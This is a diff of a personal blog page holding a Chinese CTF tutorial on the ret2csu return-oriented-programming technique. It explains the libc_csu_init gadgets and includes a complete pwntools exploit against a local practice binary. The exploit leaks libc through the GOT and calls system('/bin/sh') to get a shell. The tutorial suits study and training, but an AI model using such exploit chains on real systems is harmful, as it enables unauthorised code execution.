@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -19,15 +19,15 @@
   <meta name="author" content="roxy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="别急，还没写… 好了，现在写了… 额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的ret2csu 一般的elf文件在libc_start_main中会存在libc_csu_init对libc进行初始化，而恰好libc_csu_init中隐含着两个我们可以利用的gadget… 一般长这样，gadget1: 1234">
+    <meta name="description" content="额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的ret2csu 一般的elf文件在libc_start_main中会存在libc_csu_init对libc进行初始化，而恰好libc_csu_init中隐含着两个我们可以利用的gadget... 一般长这样，gadget1: 1234567800400606  m">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2csu">
 <meta property="og:url" content="https://rr00xxyy.github.io/2025/12/25/ret2csu/index.html">
 <meta property="og:site_name" content="roxy&#39;s blog">
-<meta property="og:description" content="别急，还没写… 好了，现在写了… 额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的ret2csu 一般的elf文件在libc_start_main中会存在libc_csu_init对libc进行初始化，而恰好libc_csu_init中隐含着两个我们可以利用的gadget… 一般长这样，gadget1: 1234">
+<meta property="og:description" content="额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的ret2csu 一般的elf文件在libc_start_main中会存在libc_csu_init对libc进行初始化，而恰好libc_csu_init中隐含着两个我们可以利用的gadget... 一般长这样，gadget1: 1234567800400606  m">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-12-25T07:58:51.000Z">
-<meta property="article:modified_time" content="2026-04-16T09:13:03.658Z">
+<meta property="article:modified_time" content="2026-06-28T18:52:40.029Z">
 <meta property="article:author" content="roxy">
 <meta property="article:tag" content="gadget">
 <meta property="article:tag" content="ret2csu">
@@ -273,48 +273,33 @@
             
               <div class="markdown-body">
                 
-                <p>别急，还没写…</p>
-<p>好了，现在写了…</p>
-<p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p>
-<p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget…</p>
+                <p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p>
+<p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget...</p>
 <p>一般长这样，<code>gadget1</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400606  mov rbx, [rsp+0x8]<br>0040060b  mov rbp, [rsp+0x10]<br>00400610  mov r12, [rsp+0x18]<br>00400615  mov r13, [rsp+0x20]<br>0040061a  mov r14, [rsp+0x28]<br>0040061f  mov r15, [rsp+0x30]<br>00400624  add rsp, 0x38<br>00400628  ret<br></code></pre></td></tr></table></figure>
-
 <p>也有可能是一串<code>pop</code>，不过本质是一样的</p>
 <p><code>gadget2</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">004005f0 mov     rdx, r15<br>004005f3 mov     rsi, r14<br>004005f6 mov     edi, r13d<br>004005f9 call    qword ptr [r12+rbx*8]<br></code></pre></td></tr></table></figure>
-
-<p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了…</p>
+<p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了...</p>
 <p>好吧，还是来看具体的题目吧</p>
 <p>题目依旧忘记出自哪里了，私密马赛</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Hello, World\n&quot;</span>,<span class="hljs-number">0xd</span>);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_88 [<span class="hljs-number">128</span>];<br>  <br>  read(<span class="hljs-number">0</span>,local_88,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>题目逻辑依旧十分简单，保护只有<code>NX</code>，非常轻松便能覆盖返回地址，缓冲区也量大管饱，而gadget便是我们的<code>libc_csu_init</code></p>
 <p>第一步还是先泄露我们的libc基址</p>
 <p>要注意的是:gadget1的地址就在gadget2后面，所以gadget1要执行两次(到ret才结束!)，不过第二次对我们rop链产生影响的只有<code>add rsp, 0x38</code>罢了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>   <span class="hljs-comment">#填充</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#对齐rsp</span><br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#rbx设置为0</span><br>payload1 += p64(<span class="hljs-number">1</span>)     <span class="hljs-comment">#注意:rbp必须设置为1，否则将进入循环，详情自己看汇编...</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)   <span class="hljs-comment">#注意是call qword ptr [r12+rbx*8]，所以写write_got而不是write_plt</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)   <br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span>  <span class="hljs-comment">#注意神秘的add rsp,0x38</span><br>payload1 += p64(main_addr)  <span class="hljs-comment">#回到main函数...</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br></code></pre></td></tr></table></figure>
-
-<p>然后接收并计算关键地址…</p>
+<p>然后接收并计算关键地址...</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure>
-
 <p>接下来，我们把字符串<code>/bin/sh</code>和<code>system</code>的真实地址写到bss段上</p>
 <p>第二阶段：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-
 <p>这样，我们将rdi设置为<code>/bin/sh</code>所在的地址，并将r12设置为system所在的地址，即可实现<code>call system</code>并获得shell</p>
 <p>最终阶段:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br></code></pre></td></tr></table></figure>
-
-<p>最后也是拿到shell了</p>
-<p>你也来试试吧!</p>
-<p>感谢阅读…</p>
+<p>最后也是拿到shell了!</p>
+<p>感谢阅读...</p>
 <p>最后还是贴一下完整exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>main_addr = <span class="hljs-number">0x400564</span><br>bss_addr = <span class="hljs-number">0x601028</span><br>gadget1 = <span class="hljs-number">0x400606</span><br>gadget2 = <span class="hljs-number">0x4005f0</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)<br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span><br>payload1 += p64(main_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br><br>sleep(<span class="hljs-number">1</span>)<br><br>leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>ps:千万别说我偷懒…</p>
-<p>2026.2.11吐槽:</p>
-<hr>
-<p>在比赛给的elf文件中从来没有看到过csu gadget…</p>
 
                 
               </div>
@@ -387,7 +372,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年4月16日</div>
+          <div>2026年6月29日</div>
         </div>
       
       
@@ -538,7 +523,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
